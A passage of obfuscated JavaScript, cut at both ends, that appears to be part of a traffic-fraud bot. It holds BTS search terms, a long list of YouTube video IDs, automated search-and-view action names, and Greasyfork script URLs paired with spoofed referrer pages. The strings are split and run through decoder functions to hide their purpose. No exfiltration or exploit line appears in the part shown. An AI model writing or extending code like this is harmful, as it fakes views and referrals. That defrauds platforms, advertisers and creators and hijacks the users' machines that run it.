'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x14ef + 0x13 * -0x1d9 + 0xe2f * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    S(0x3) + 'Q',
    'u6RVZKcN9z' + 'Q',
    U(0xf, 'yu3$') + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    U(0x13, 'uowq') + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    T(0x11) + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0x9) + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + S(0xc) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + S(0x7) + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + U(0x5, 'n8QM') + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + S(0xc) + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x2, 'gA6Q') + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
